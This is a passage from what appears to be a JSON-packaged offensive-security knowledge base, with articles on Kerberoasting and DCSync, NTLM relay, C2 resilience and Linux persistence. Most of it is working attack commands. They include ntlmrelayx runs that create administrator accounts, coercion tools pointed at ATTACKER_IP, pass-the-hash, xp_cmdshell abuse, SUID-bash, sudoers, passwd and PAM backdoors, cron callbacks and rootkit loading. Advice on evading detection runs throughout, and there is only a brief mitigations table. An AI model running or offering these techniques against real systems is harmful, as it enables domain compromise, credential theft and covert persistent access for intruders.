1} | Select samaccountname, serviceprincipalname\n\n# Single targeted request (1 ticket vs hundreds):\n.\\Rubeus.exe kerberoast /user:svcSQL /outfile:tgs_sql.txt\n\n# AES-only accounts: request AES instead of RC4 (some SIEM rules look for RC4 downgrade):\n.\\Rubeus.exe kerberoast /user:svcSQL /tgtdeleg /enctype:aes256\n\n# Time-spread: one ticket per hour to avoid Event 4769 spike correlation\n```\n\n### Opsec-Aware Credential Extraction\n\nExtract credentials without touching LSASS (primary EDR monitoring target):\n\n```bash\n# DCSync — replicate credentials via DRSUAPI (requires DA or equivalent DACL rights)\n# No LSASS touch — uses legitimate AD replication protocol\nimpacket-secretsdump -just-dc corp.local/admin:pass@dc01.corp.local\n\n# VSS (Volume Shadow Copy) — read SAM/NTDS from shadow copy\nwmic shadowcopy call create Volume='C:\\'\nvssadmin list shadows\n# Copy from shadow:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\System32\\config\\SYSTEM .\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyX\\Windows\\NTDS\\ntds.dit .\nimpacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash\n\n# Detecting DCSync evasion:\n# Event 4662 with GUID {1131f6aa...} = DS-Replication-Get-Changes\n# Evasion: perform DCSync from an authorized DC-like host (RODC) if already compromised\n```\n\n### Sapphire Tickets — Stealth Golden Ticket Variant (2025+)\n\nSapphire tickets are a newer Golden Ticket variant that passes PAC validation:\n\n```\nStandard Golden Ticket: forged PAC → detected by PAC validation (Kerberos policy)\nDiamond Ticket: real PAC from a real TGT, modified → harder to detect\nSapphire Ticket: steal a real PAC from a high-privileged user's TGT,\n embed in your own forged TGT\n\nResult:\n- PAC is cryptographically real (from real user)\n- TGT is forged (you can specify any username)\n- PAC validation passes (real PAC signature)\n- Available in Rubeus as /sapphire flag (2023+)\n\nUse: impacket + Rubeus.exe diamond /krbkey:AES_KEY /sapphire /ptt\n```\n\n### Delegation Attack Chains\n\nCombining delegation attacks for multi-hop privilege escalation:\n\n```\nChain: RBCD → constrained delegation → service impersonation\n\nScenario:\n1. Compromise WORKSTATION$ (low-privilege machine account)\n2. Find server with constrained delegation to SQL: SRV-SQL$ trusted for cifs/DC01\n3. Set RBCD: SRV-SQL$ allowed to act on behalf of WORKSTATION$\n4. S4U2Self (WORKSTATION$ → service ticket for Administrator to itself)\n5. S4U2Proxy (use that ticket to request cifs/DC01 for Administrator)\n6. Access DC01's CIFS as Administrator → DCSync → game over\n\nKey tool: impacket-getST with -impersonate and -additional-ticket flags\n```", "last_updated": "2026-03-18"}, "ntlm-relay": {"slug": "ntlm-relay", "title": "NTLM Relay Attacks", "category": "Network Attacks", "content": "# NTLM Relay Attacks\n\n## ◈ BEGINNER\n\n### What Is NTLM Relay?\n\n**NTLM relay** is one of the most impactful attacks in Active Directory environments. Instead of cracking an NTLM password hash, you relay the authentication challenge to another service — gaining access as the victim without ever knowing their password.\n\n**How NTLM authentication works:** NTLM uses a challenge-response mechanism. The server sends a random challenge (nonce); the client responds with an HMAC-MD5 of their password hash combined with that challenge. The relay attack intercepts this exchange and replays the victim's response to a different target.\n\n**Key terms:**\n- **NTLM** — NT LAN Manager; legacy Windows authentication protocol still widely used despite Kerberos preference; no mutual authentication of the server\n- **Challenge-response** — the NTLM authentication flow: server sends 8-byte nonce, client hashes their password + nonce and sends the result\n- **NTLM relay** — intercepting NTLM authentication and forwarding it to a different target; victim authenticates you to the target without knowing it\n- **SMB signing** — a defense that adds a cryptographic signature to SMB messages; prevents relay to SMB (you can't sign with a key you don't have); DCs require it by default, workstations often don't\n- **Responder** — a tool that poisons LLMNR/NBT-NS/MDNS name resolution to capture NTLM authentication attempts from Windows hosts\n- **ntlmrelayx** — impacket's relay tool; can relay captured NTLM authentication to SMB, LDAP, MSSQL, ADCS, and many other services\n- **LLMNR/NBT-NS** — Windows name resolution fallbacks; if DNS fails for \"FILESERVER\", Windows broadcasts to ask the local network; Responder answers \"I am FILESERVER\"\n- **ADCS relay (ESC8)** — relaying to Active Directory Certificate Services to get a certificate for a machine account; certificate → PKINIT → TGT → DCSync\n- **Pass-the-Hash (PtH)** — once you have an NTLM hash, use it directly to authenticate without cracking it\n- **Coercion** — forcing a Windows service to authenticate to the attacker; tools: PetitPotam, PrinterBug, Coercer; turns privilege into credential\n\n**The classic relay chain:**\n```\n1. Responder poisons LLMNR: victim looks for \"FILESERVER\" → attacker responds\n2. Victim authenticates to attacker (sends NTLM challenge/response)\n3. ntlmrelayx relays the authentication to a real target (SMB on workstation)\n4. Attacker gains access to target as victim — no password ever cracked\n```\n\n**Why it's so effective:** Every Windows workstation that doesn't require SMB signing is a potential relay target. In most corporate networks, that's 80%+ of machines. Combined with Responder's automatic poisoning, NTLM relay often yields compromised systems within minutes of starting.\n\n**Analogy:** NTLM relay is like a phone relay scam. Someone calls you asking \"is this the bank?\", you say yes to establish trust. They put you on hold, call the real bank, and when the bank asks for your customer ID, they relay your response. The bank thinks it's talking directly to you — but it's actually the attacker in the middle.\n\n## ◈ INTERMEDIATE\n\nNTLM relay attacks intercept NTLM authentication challenges and relay them to target services, gaining access without ever cracking the password. They are among the most impactful attacks in Active Directory environments.\n\n### NTLM Authentication Protocol\n\n```\n1. Client → Server: NEGOTIATE_MESSAGE (I support NTLM)\n2. Server → Client: CHALLENGE_MESSAGE (here is my 8-byte nonce)\n3. Client → Server: AUTHENTICATE_MESSAGE (here is HMAC-MD5(NT_hash, nonce))\n\nRelay attack — attacker is in the middle:\n1. Attacker → Target: NEGOTIATE (on behalf of victim)\n2. Target → Attacker: CHALLENGE (nonce from target)\n3. Attacker → Victim: CHALLENGE (same nonce — trick victim into signing for target)\n4. Victim → Attacker: AUTHENTICATE (valid response for target's nonce)\n5. Attacker → Target: AUTHENTICATE (relay victim's response)\n6. Target → Attacker: ACCESS GRANTED as victim\n```\n\n---\n\n### Prerequisites: SMB Signing\n\nSMB relay only works if the target has SMB signing **disabled or not required**:\n\n```bash\n# Check SMB signing across subnet\nnmap --script smb2-security-mode -p 445 192.168.1.0/24\n# \"Message signing enabled but not required\" → RELAYABLE\n# \"Message signing enabled and required\" → NOT relayable (DC default)\n\n# CrackMapExec\ncme smb 192.168.1.0/24 --gen-relay-list relay_targets.txt\n# Outputs all hosts where signing is not required\n```\n\n---\n\n### Responder: Capture NTLM Hashes\n\nResponder poisons LLMNR, NBT-NS, and MDNS to capture NTLM hashes:\n\n```bash\n# Install\ngit clone https://github.com/lgandx/Responder\n\n# Run Responder (capture hashes but don't relay — disable SMB/HTTP servers for relay)\nsudo python3 Responder.py -I eth0 -wFbv\n\n# For relay attack: disable SMB and HTTP servers in Responder\n# Edit Responder.conf: SMB = Off, HTTP = Off\nsudo python3 Responder.py -I eth0 -wFbv\n# Then run ntlmrelayx on the side\n```\n\n```\nResponder captures:\n- LLMNR queries: \"Who is FILESERVER?\" → Responder: \"I am!\" → victim authenticates\n- NBT-NS (NetBIOS Name Service): legacy name resolution\n- MDNS: Multicast DNS\n- WPAD: Web Proxy Auto-Discovery (very effective)\nHashes saved to: /usr/share/responder/logs/\n```\n\n---\n\n### ntlmrelayx (Impacket)\n\nThe primary relay tool — can relay to SMB, LDAP, LDAPS, MSSQL, HTTP, and more:\n\n```bash\n# Relay to SMB — execute command on target\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -c \"net user hacker P@ss123! /add && net localgroup administrators hacker /add\"\n\n# Relay to SMB — interactive shell\nimpacket-ntlmrelayx -tf relay_targets.txt -smb2support -i\n# Connect to shell: nc 127.0.0.1 11000\n\n# Relay to LDAP — dump domain info\nimpacket-ntlmrelayx -t ldap://192.168.1.10 --no-http-server --no-smb-server\n\n# Relay to LDAPS — create new domain admin user\nimpacket-ntlmrelayx -t ldaps://192.168.1.10 --add-computer EVIL$ --escalate-user lowprivuser\n\n# Relay to LDAPS — shadow credentials (adds Key Credential to target account)\nimpacket-ntlmrelayx -t ldaps://192.168.1.10 --shadow-credentials --shadow-target targetuser\n\n# Relay to MSSQL — xp_cmdshell\nimpacket-ntlmrelayx -t mssql://192.168.1.20 --no-http-server -q \"EXEC xp_cmdshell('whoami')\"\n\n# Relay to ADCS (Active Directory Certificate Services) — get certificate\nimpacket-ntlmrelayx -t http://192.168.1.10/certsrv/certfnsh.asp \\\n --adcs --template \"DomainController\"\n# Certificate → PKINIT → TGT → DCSync\n\n# Delegate access (RBCD setup)\nimpacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate-access --escalate-user WORKSTATION$\n```\n\n---\n\n### NTLM Hash Cracking\n\nCaptured hashes from Responder:\n\n```bash\n# NTLMv1 (-m 5500)\nhashcat -m 5500 ntlmv1.txt /usr/share/wordlists/rockyou.txt\n\n# NTLMv2 (-m 5600)\nhashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt -r best64.rule\n\n# john\njohn --wordlist=rockyou.txt --format=netntlmv2 ntlmv2.txt\n```\n\n---\n\n### Triggering NTLM Authentication (Coercion)\n\n```bash\n# PrinterBug (SpoolSample): coerce DC to authenticate to attacker\n# Requires: domain user, SMB access to DC\npython3 printerbug.py corp.local/user:pass@dc01.corp.local ATTACKER_IP\n\n# PetitPotam: coerce via EFS (MS-EFSRPC) — unauth in original, patched\npython3 PetitPotam.py -d corp.local -u user -p pass ATTACKER_IP dc01.corp.local\n\n# Coercer: comprehensive coercion tool (30+ methods)\ncoercer coerce -l ATTACKER_IP -t dc01.corp.local -u user -p pass -d corp.local\n\n# DFSCoerce: via MS-DFSNM\npython3 dfscoerce.py -d corp.local -u user -p pass ATTACKER_IP dc01.corp.local\n\n# ShadowCoerce: via MS-FSRVP\npython3 shadowcoerce.py -d corp.local -u user -p pass ATTACKER_IP dc01.corp.local\n```\n\n---\n\n### ADCS Relay (ESC8)\n\nOne of the most powerful relay attack chains — relay authentication to ADCS HTTP endpoint to get a certificate, then use PKINIT to get a TGT:\n\n```bash\n# Step 1: Identify ADCS enrollment web service\n# http://CA_SERVER/certsrv/ → web enrollment enabled\n\n# Step 2: Relay victim DC$ account to ADCS\nimpacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp \\\n --adcs --template DomainController\n\n# Step 3: Coerce DC to authenticate to attacker\npython3 PetitPotam.py ATTACKER_IP dc01.corp.local\n\n# Step 4: ntlmrelayx captures DC$ certificate (base64 PFX)\n# Step 5: Use certificate for PKINIT TGT\npython3 gettgtpkinit.py -pfx-base64 BASE64_CERT corp.local/dc01$ /tmp/dc.ccache\n\n# Step 6: Use TGT for DCSync (dump all hashes)\nexport KRB5CCNAME=/tmp/dc.ccache\nimpacket-secretsdump -k -no-pass dc01.corp.local\n```\n\n---\n\n### Cross-Protocol Relay (SMB → LDAP)\n\nRelay from SMB to LDAP to bypass SMB signing on DCs:\n\n```bash\n# Even if DC requires SMB signing, LDAP signing often not required\n# Relay SMB authentication to LDAP instead\n\nimpacket-ntlmrelayx -t ldap://dc01.corp.local \\\n --no-smb-server # keep HTTP server for WPAD-triggered auth\n# WPAD → victim authenticates to Responder HTTP → relay to LDAP\n# Result: domain info dump, or user creation with rights\n```\n\n---\n\n### Pass-the-Hash (PtH)\n\nOnce NTLM hash captured, use directly without cracking:\n\n```bash\n# CrackMapExec\ncme smb 192.168.1.0/24 -u Administrator -H NTLM_HASH\n\n# Impacket tools — all support -hashes flag\nimpacket-psexec corp.local/Administrator@192.168.1.20 -hashes :NTLM_HASH\nimpacket-wmiexec corp.local/Administrator@192.168.1.20 -hashes :NTLM_HASH\nimpacket-smbclient corp.local/Administrator@192.168.1.20 -hashes :NTLM_HASH\n\n# Mimikatz\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe\n```\n\n---\n\n### Mitigations\n\n| Mitigation | Effect |\n|------------|--------|\n| Enable SMB signing (required) | Prevents SMB relay |\n| Enable LDAP signing + channel binding | Prevents LDAP relay |\n| Disable NTLM (use Kerberos only) | Eliminates NTLM relay |\n| Enable EPA (Extended Protection for Auth) | Prevents cross-protocol relay |\n| Disable LLMNR and NBT-NS | Prevents Responder poisoning |\n| Disable WPAD or use PAC file | Prevents WPAD-triggered auth |\n| Tier 0 isolation (DC auth separation) | Limits blast radius |\n\n## ◈ ADVANCED\n\n### Shadow Credentials — Certificate-Based Persistence via Relay\n\nThe shadow credentials technique adds a Key Credential to an Active Directory object, enabling authentication via PKINIT (certificate) without the account's password:\n\n```bash\n# Relay to LDAPS with shadow credentials attack\nimpacket-ntlmrelayx -t ldaps://dc01.corp.local \\\n --shadow-credentials \\\n --shadow-target targetuser # or machine$\n\n# When relay succeeds: ntlmrelayx generates RSA keypair\n# Adds public key to target's msDS-KeyCredentialLink attribute\n# Saves private key to disk\n\n# Use private key for PKINIT to get TGT:\npython3 gettgtpkinit.py -cert-pfx shadowcreds.pfx \\\n corp.local/targetuser /tmp/targetuser.ccache\n\nexport KRB5CCNAME=/tmp/targetuser.ccache\n# Now have valid TGT for targetuser — persists even after password change\n```\n\n### Multi-Target Relay Automation\n\nFor large environments, automate relay to maximize yield:\n\n```bash\n# Generate relay target list from CrackMapExec\ncme smb 192.168.1.0/24 --gen-relay-list /tmp/relay_targets.txt\n\n# ntlmrelayx with multiple targets (round-robins through list)\nimpacket-ntlmrelayx -tf /tmp/relay_targets.txt \\\n -smb2support \\\n --dump-laps \\ # dump LAPS passwords when relaying to LDAP\n -l /tmp/loot/ # output directory for all captures\n\n# For SMB targets: auto-execute command\nimpacket-ntlmrelayx -tf relay_targets.txt \\\n -smb2support \\\n --no-http-server \\\n -c \"powershell -enc BASE64_PAYLOAD\"\n\n# Monitor: watch /tmp/loot for files dumped per successful relay\n# Each successful relay creates a directory with SAM, LSA, user data\n```\n\n### Cross-Protocol Relay Chains\n\nChain multiple relay attacks for escalation:\n\n```\nChain: WPAD poisoning → HTTP auth → LDAP relay → RBCD setup → Impersonation\n\n1. Responder serves WPAD (web proxy config requiring auth)\n2. ntlmrelayx relays HTTP auth to LDAP (HTTP doesn't require signing)\n3. With domain user: set RBCD attribute on target machine\n4. Add attacker machine account: ATTACKER$\n5. S4U to impersonate Domain Admin to target machine\n6. Full machine compromise without any SMB signing bypass needed\n\nThis chain works even when:\n- SMB signing is enforced everywhere (HTTP→LDAP doesn't touch SMB)\n- LDAP signing is not enforced (majority of environments)\n```\n\n### Relay to MSSQL — xp_cmdshell via Hash\n\n```bash\n# Relay to SQL Server with SA/sysadmin account\nimpacket-ntlmrelayx -t mssql://192.168.1.30 \\\n -q \"EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'net user hacker P@ss123! /add && net localgroup administrators hacker /add'\"\n\n# Coerce SQL Server service account authentication:\n# If SQL Server runs as domain account, coerce that account → relay to another SQL server\n# Lateral movement through SQL trust relationships (linked servers)\n```", "last_updated": "2026-03-18"}, "c2-persistence": {"slug": "c2-persistence", "title": "C2 Persistence & Resilience", "category": "Persistence", "content": "# C2 Persistence & Resilience\n\n## ◈ BEGINNER\n\n### What is C2 Persistence?\n\nC2 (Command and Control) persistence is about keeping your communication channel to a compromised network alive even when things go wrong — the C2 server gets taken down, the domain gets blacklisted, or network defenses change. Standard persistence keeps your implant running; C2 persistence keeps your implant talking.\n\n**Why is this hard?**\nDefenders actively hunt C2 infrastructure. They blacklist domains, block IP addresses, analyze traffic patterns, and seize servers. A well-prepared attacker designs their C2 like a resilient network: multiple paths, failover, and the ability to change addresses without updating the implant.\n\n**Key concepts:**\n- **Fallback channel** — a secondary communication method the implant switches to if the primary fails\n- **Domain fronting** — making C2 traffic appear to go to a legitimate CDN (like Cloudflare) while secretly routing to the attacker's server\n- **DGA (Domain Generation Algorithm)** — a shared algorithm that generates hundreds of domain names; the attacker registers a few; the implant tries them all\n- **Dead drop resolver** — hiding the current C2 address in a third-party service (GitHub, Pastebin, DNS TXT records) that the implant queries\n- **Sleep and jitter** — controlling how often the implant checks in and randomizing the interval to avoid detection\n- **P2P mesh** — implants that communicate with each other, with only one needing internet access\n\n**The resilience goal:** If defenders take down your infrastructure on Day 10, your implants should automatically find new infrastructure without you manually updating each one.\n\n**Analogy:** Think of a spy network where each agent has a primary contact, two backup contacts, and knows to check a specific classified ad section if all contacts go dark. That's the C2 resilience model.\n\n## ◈ INTERMEDIATE\n\nEnsuring reliable command-and-control communication survives network changes, infrastructure takedowns, and defender intervention.\n\n## Multiple Listener Redundancy\n\nDeploy implants with fallback listener configurations:\n\n```\nPrimary: HTTPS callback to https://cdn-assets.legitimate-site.com (domain fronted)\nSecondary: DNS callback to ns1.backup-domain.com (DNS C2)\nTertiary: SMB named pipe for peer-to-peer relay\nEmergency: Dead drop check every 24 hours via DNS TXT record\n```\n\nConfigure the implant to cycle through channels on primary failure, with exponential backoff. Each channel should use different infrastructure to avoid single points of failure.\n\n## Domain Fronting\n\nRoute C2 traffic through high-reputation CDNs by exploiting the difference between the TLS SNI and HTTP Host header:\n\n```\nTLS SNI: cdn.cloudflare.com (high reputation, never blocked)\nHTTP Host: c2.attacker-controlled.com (attacker's origin behind CDN)\n```\n\nThe network sees traffic to `cdn.cloudflare.com` but the CDN routes the request to the attacker's origin based on the Host header. Effective against SSL inspection that only checks SNI.\n\n**Note**: Many CDN providers have restricted domain fronting since 2018-2023. Test thoroughly before relying on this channel.\n\n## Dead Drop Resolvers\n\nUse legitimate third-party services to publish C2 infrastructure addresses:\n\n```\n# DNS TXT record\ndig TXT update-check.attacker-domain.com\n# Returns base64-encoded C2 address\n\n# GitHub/GitLab\n# Commit a file with encoded C2 address to a public repo\n# Implant fetches raw file content via API\n\n# Pastebin/GitHub Gists\n# Publish encoded C2 config, implant polls periodically\n```\n\nDead drop resolvers allow changing C2 infrastructure without updating the implant.\n\n## Domain Generation Algorithms (DGA)\n\nImplant and server share an algorithm that generates predictable domain names:\n\n```\n# Algorithm: SHA-256(seed + date + index), consonant/vowel interleaving\n# Both sides generate the same domains for each day\n# Attacker registers a subset of generated domains\n\nDay 1: xelomati.com, bukanero.net, zipovade.org\nDay 2: malotrix.com, huverani.net, dopezami.org\n```\n\nDGA provides resilience against domain seizure — defenders must predict or reverse-engineer the algorithm to sinkhole all possible domains.\n\n## P2P / Mesh Networking\n\nImplants communicate with each other, forming a resilient mesh:\n\n```\nInternet-facing implant (egress node) <-> Internal implant A\n <-> Internal implant B <-> Internal implant C\n```\n\nIf the egress node is discovered, other implants can elect a new egress node. Communication between implants uses SMB named pipes, TCP, or WMI.\n\n## Sleep and Jitter Configuration\n\n```\nBase sleep: 300 seconds (5 minutes)\nJitter: 30% (sleep varies 210-390 seconds)\nWorking hours: 08:00-18:00 target timezone only\nWeekend: Sleep 8 hours between check-ins\n```\n\nIrregular beaconing intervals prevent pattern-based detection. Working-hours-only activity blends with legitimate user traffic.\n\n## Cloud Storage C2\n\nUse legitimate cloud APIs as C2 channels:\n\n```\n# Microsoft Graph API (OneDrive/SharePoint)\n# Implant reads commands from a OneDrive file\n# Writes results to a different file\n# Traffic appears as normal OneDrive sync\n\n# Slack/Discord/Telegram\n# Bot API for bidirectional communication\n# Blends with legitimate collaboration traffic\n```\n\n## Redundant Persistence Layering\n\nDeploy multiple persistence mechanisms that reinstall each other:\n\n```\nPersistence A (Scheduled Task) checks for Persistence B\nPersistence B (WMI Subscription) checks for Persistence C\nPersistence C (COM Hijack) checks for Persistence A\n\nIf any one is removed, the others reinstall it on next trigger.\n```\n\n## OpSec Notes\n\n- Domain fronting effectiveness varies by CDN provider and changes frequently\n- DGA domains can be predicted by defenders who reverse-engineer the algorithm — use strong seeds\n- Dead drop services may be monitored or taken down — diversify across platforms\n- Cloud API C2 requires OAuth tokens that expire — implement token refresh logic\n- P2P mesh traffic on unusual ports may trigger network anomaly detection\n- Self-update mechanisms must validate integrity to prevent defender-injected poisoned updates\n\n## ◈ ADVANCED\n\n### Traffic Blending via Malleable Profiles\n\nConfigure C2 traffic to mimic legitimate application patterns at the byte level:\n\n```\n# Malleable profile matching OneDrive sync\nset sleeptime \"60000\";\nset jitter \"37\";\nset useragent \"Microsoft SkyDriveSync ...\";\nhttp-get {\n set uri \"/v1.0/me/drive/root/children\";\n header \"Accept\" \"application/json\";\n}\nhttp-post {\n set uri \"/v1.0/me/drive/items\";\n header \"Content-Type\" \"application/json\";\n}\n```\n\nMatch URI patterns, headers, request/response sizes, and timing to the legitimate application being mimicked. Test against threat intelligence platforms to verify the profile passes inspection.\n\n### Implant Self-Update Architecture\n\nPush updated implant code through the C2 channel for signature rotation:\n\n```\n1. Server sends new implant binary or shellcode via C2 channel\n2. Current implant verifies integrity (hash/signature)\n3. New implant is loaded reflectively in memory\n4. Old implant transfers state (keys, config, task queue) to new instance\n5. Old implant exits\n\nThis allows patching evasion techniques, adding modules, and rotating\nsignatures without re-deploying from initial access.\n```\n\n### Blockchain Dead Drop Resolver\n\nTraditional dead drops (GitHub, Pastebin) can be taken down. Blockchain transactions are permanent:\n\n```\n1. Attacker embeds OP_RETURN data in a Bitcoin/Ethereum transaction\n2. Transaction encodes C2 address in the transaction's data field\n3. Implant queries blockchain explorer APIs for the wallet's latest transaction\n4. Decodes the embedded data to get the current C2 address\n\nAdvantages:\n- Immutable: law enforcement cannot remove blockchain data\n- Resilient: thousands of nodes replicate the data\n- Deniable: transaction looks like normal cryptocurrency activity\n\nImplementation: use public blockchain explorer APIs (blockchair.com, etc.)\n```\n\n### Encrypted Callback Schedule\n\nImplant stores an encrypted schedule defining when to callback and to which listener:\n\n```\nMonday-Friday 08:00-18:00: HTTPS primary, 5-min intervals\nMonday-Friday 18:00-08:00: DNS secondary, 30-min intervals\nSaturday-Sunday: DNS tertiary, 2-hour intervals\nEmergency: Check dead drop every 6 hours regardless of schedule\n```\n\nThe schedule is encrypted with a key derived from system-specific attributes — prevents analysis of a captured implant from revealing the full C2 infrastructure.\n\n### Covert C2 via Protocol Steganography\n\nHide C2 traffic inside legitimate protocol flows:\n\n```\nHTTP/2 HEADERS frame: encode commands in pseudo-header values\nDNS EDNS options: embed C2 data in EDNS0 option fields\nICMP timestamp: encode commands in the originate timestamp field\nTLS certificate: embed C2 address in a dynamically generated cert's SAN field\n```\n\nThese channels survive SSL inspection (the traffic IS legitimate protocol) and are essentially undetectable without deep protocol-level behavioral analysis.\n\n### Offline Mode with Task Queue\n\nWhen all C2 channels fail:\n\n```\n1. Continue executing scheduled tasks (keylogging, credential harvesting)\n2. Queue results locally (encrypted, in-memory or hidden file)\n3. Attempt C2 reconnection with exponential backoff\n4. On reconnection, flush queued results to server\n5. Maximum offline duration before self-destruct (configurable)\n```\n\nPrevents implants from going dark indefinitely during infrastructure outages while maintaining operational security through the queue encryption and self-destruct timer.", "last_updated": "2026-03-18"}, "linux-persistence": {"slug": "linux-persistence", "title": "Linux Persistence Techniques", "category": "Persistence", "content": "# Linux Persistence Techniques\n\n## ◈ BEGINNER\n\n### What is Linux Persistence?\n\nPersistence on Linux means leaving behind mechanisms that restore your access if your current connection is disrupted, the server reboots, or your initial access vector is patched. Unlike Windows, Linux has no single \"Run key\" — instead, attackers leverage many built-in system mechanisms.\n\n**Why persistence matters:**\nA reverse shell gives you temporary access. If the shell dies, the server reboots, or the process is killed, you lose access. Persistence ensures you can reconnect without re-exploiting the vulnerability — which is important because the vulnerability might get patched.\n\n**Key terms:**\n- **cron** — Linux's task scheduler; jobs in crontab run automatically at specified times\n- **systemd** — the modern Linux init system; controls services and timers that start on boot\n- **authorized_keys** — SSH's list of approved public keys; add yours to log in without a password forever\n- **PAM (Pluggable Authentication Modules)** — Linux's authentication framework; a backdoored PAM module accepts any password\n- **ld.so.preload** — a configuration file that makes Linux load a library into EVERY process; a powerful rootkit mechanism\n- **SUID binary** — a file with the Set-UID bit; runs as its owner (often root) regardless of who executes it\n\n**Linux persistence locations to check:**\n- `/etc/cron.*` directories — cron jobs\n- `/etc/systemd/system/` — system services\n- `~/.ssh/authorized_keys` — SSH keys\n- `/etc/profile.d/` — shell startup scripts\n- `/etc/ld.so.preload` — library preload\n\n**Analogy:** Think of a building with many different entrance points — front door (SSH), loading dock (web shell), roof access (kernel module), service elevator (cron). Linux persistence is leaving a way in at each entrance so removing one doesn't lock you out entirely.\n\n## ◈ INTERMEDIATE\n\nMaintaining access to compromised Linux systems through legitimate system mechanisms and covert methods.\n\n## Cron Jobs\n\n```bash\n# User crontab\n(crontab -l 2>/dev/null; echo \"*/15 * * * * /tmp/.hidden/callback.sh\") | crontab -\n\n# System cron\necho \"*/15 * * * * root /opt/.svc/persist.sh\" >> /etc/cron.d/system-maintenance\n\n# Cron directories (daily/hourly/weekly)\ncp callback.sh /etc/cron.daily/system-update\nchmod +x /etc/cron.daily/system-update\n```\n\nName scripts to blend with legitimate system maintenance tasks. Avoid `/tmp` paths in system crons as `/tmp` may be mounted `noexec` or cleaned on boot.\n\n## Systemd Services and Timers\n\n**System-level** (requires root):\n```ini\n# /etc/systemd/system/system-update.service\n[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nType=simple\nRestart=always\nRestartSec=60\nWorkingDirectory=/opt/.svc\nRuntimeMaxSec=infinity\n\n[Install]\nWantedBy=multi-user.target\n```\n\n```bash\nsystemctl daemon-reload\nsystemctl enable system-update.service\nsystemctl start system-update.service\n```\n\n**User-level** (no root needed):\n```bash\nmkdir -p ~/.config/systemd/user/\n# Create service file in ~/.config/systemd/user/\nsystemctl --user enable myservice.service\nsystemctl --user start myservice.service\n# Enable lingering so user services run without login\nloginctl enable-linger username\n```\n\n## SSH Authorized Keys\n\n```bash\n# Add your public key for passwordless access\necho \"ssh-ed25519 AAAA... comment\" >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n\n# Hide key in legitimate-looking comment\necho \"ssh-ed25519 AAAA... admin@management.internal\" >> /root/.ssh/authorized_keys\n```\n\n## Shell Profile Modification\n\n```bash\n# Trigger on interactive login\necho '/opt/.svc/callback.sh &' >> ~/.bashrc\necho '/opt/.svc/callback.sh &' >> ~/.bash_profile\necho '/opt/.svc/callback.sh &' >> ~/.profile\n\n# System-wide (all users)\necho '/opt/.svc/callback.sh &' >> /etc/profile.d/system-env.sh\nchmod +x /etc/profile.d/system-env.sh\n```\n\n## LD_PRELOAD / ld.so.preload\n\n```bash\n# /etc/ld.so.preload — loaded into every dynamically linked process\necho \"/opt/.lib/persist.so\" > /etc/ld.so.preload\n\n# The shared library can hook key functions\n# This is the basis of many userland rootkits\n```\n\n## SUID Binary Backdoor\n\n```bash\n# Create SUID copy of bash\ncp /bin/bash /usr/local/bin/.suid_bash\nchmod u+s /usr/local/bin/.suid_bash\n# Access: /usr/local/bin/.suid_bash -p\n```\n\n## Sudoers Modification\n\n```bash\n# Grant passwordless sudo to compromised user\necho \"username ALL=(ALL) NOPASSWD: ALL\" > /etc/sudoers.d/system-policy\nchmod 440 /etc/sudoers.d/system-policy\n```\n\n## /etc/passwd Backdoor\n\n```bash\n# Add root-equivalent user\necho 'svc:$1$salt$hash:0:0:Service Account:/root:/bin/bash' >> /etc/passwd\n```\n\n## Udev Rules\n\n```bash\n# Trigger payload when specific device events occur\necho 'ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/opt/.svc/callback.sh\"' > /etc/udev/rules.d/99-persistence.rules\n```\n\n## Git Hooks\n\n```bash\n# If target maintains git repositories\necho '#!/bin/bash' > /path/to/repo/.git/hooks/pre-commit\necho '/opt/.svc/callback.sh &' >> /path/to/repo/.git/hooks/pre-commit\nchmod +x /path/to/repo/.git/hooks/pre-commit\n```\n\n## OpSec Comparison\n\n| Technique | Stealth | Root Required | Survives Updates |\n|-----------|---------|---------------|-----------------|\n| Cron | Low | No (user) | Yes |\n| Systemd | Medium | No (user) | Yes |\n| SSH Keys | High | No | Yes |\n| PAM Backdoor | Very High | Yes | No (PAM updates) |\n| ld.so.preload | High | Yes | Yes |\n| Kernel Module | Very High | Yes | No (kernel updates) |\n| Shell Profile | Low | No | Yes |\n\nLayer multiple techniques across different mechanism types for resilience against partial detection.\n\n## ◈ ADVANCED\n\n### PAM Module Backdoor\n\nA PAM module backdoor accepts a hardcoded master password in addition to the real password — every authentication mechanism (SSH, sudo, login) checks PAM:\n\n```\n1. Write a custom PAM shared library that:\n - If password matches backdoor string → authenticate success\n - Otherwise → fall through to real pam_unix.so\n - Log intercepted passwords to encrypted file\n\n2. Install: copy to /lib/x86_64-linux-gnu/security/\n3. Add to /etc/pam.d/common-auth BEFORE pam_unix:\n auth sufficient pam_custom.so\n\nDetection evasion:\n- Match mtime of modified PAM config to pre-modification value\n- Use 'sufficient' instead of 'required' to fall through naturally\n- Name the .so file to blend with legit PAM modules\n```\n\n### Shared Library Injection via ld.so.conf.d\n\nMore targeted than /etc/ld.so.preload — load malicious library into specific processes:\n\n```bash\n# Add directory with malicious library before system libs\necho \"/tmp/libs\" > /etc/ld.so.conf.d/custom.conf\nldconfig\n\n# Library with constructor (runs when loaded by any process using affected lib):\n# __attribute__((constructor)) void init() { ... }\n# gcc -shared -fPIC -o /tmp/libs/libcustom.so malicious.c\n```\n\n### Kernel Module Persistence\n\nKernel modules provide the deepest access — they run in ring 0, can hide files/processes/connections:\n\n```bash\n# Load malicious kernel module\ninsmod /path/to/rootkit.ko\n\n# Well-known rootkits:\n# Diamorphine — hide processes, files, grant root via kill signal\n# Reptile — process/file hiding, reverse shell, port knocking trigger\n# Adore-ng — classic rootkit\n\n# Persistence: add to modules-load.d\necho \"rootkit_name\" >> /etc/modules-load.d/misc.conf\n# Or add to /etc/modules\n\n# Kernel module detection evasion:\n# Use 